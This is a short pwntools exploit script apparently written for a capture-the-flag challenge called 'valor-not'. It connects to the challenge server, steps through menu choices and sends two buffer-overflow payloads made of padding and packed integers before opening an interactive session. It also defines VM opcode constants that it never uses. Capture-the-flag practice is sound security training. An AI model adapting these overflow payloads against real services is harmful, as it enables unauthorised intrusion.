from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64

OP_NOP = 0x00
OP_PUSH = 0x01
OP_POP  = 0x02
OP_DUP  = 0x03
OP_SWAP = 0x04
OP_ADD = 0x10
OP_SUB = 0x11
OP_MUL = 0x12
OP_DIV = 0x13
OP_MOD = 0x14

OP_EQ     = 0x20
OP_LT     = 0x21
OP_GT     = 0x22
OP_ISZERO = 0x23

OP_JMP      = 0x30
OP_JUMPIF   = 0x31
OP_JMPREL   = 0x32
OP_JMPRELIF = 0x33

OP_RET   = 0x80
OP_ERR   = 0x81
OP_SLEEP = 0x82
OP_DUMP  = 0x83

OP_ID     = 0xf0
OP_RECV   = 0xf1
OP_SEND   = 0xf2
OP_DELETE = 0xf3
OP_LAUNCH = 0xfd
OP_RESET  = 0xfe
OP_JOIN   = 0xff

CODE_SIZE = 0x4000

if args.LOCAL:
    io = process(["./valor-not"])
    if args.GDB:
        cmd = """
        """    
        gdb.attach(io, cmd)
        
else: 
    io = remote("valornt.chal.pwni.ng", 1337)

io.sendline(b'0')
io.sendline(b'y')

io.sendline(b'cheater')
io.sendline(b'y')
pl = b'A'*0x64 + p32(1) + p32(0)
io.sendline(pl)

for i in range(5):
    io.sendline(b'1')
    io.sendline(b'n')
    
io.sendline(b'3')
io.sendline(b'n')


pause()
io.sendline(b'y')
io.sendline(b'A'*0x59+b'heck')
io.interactive()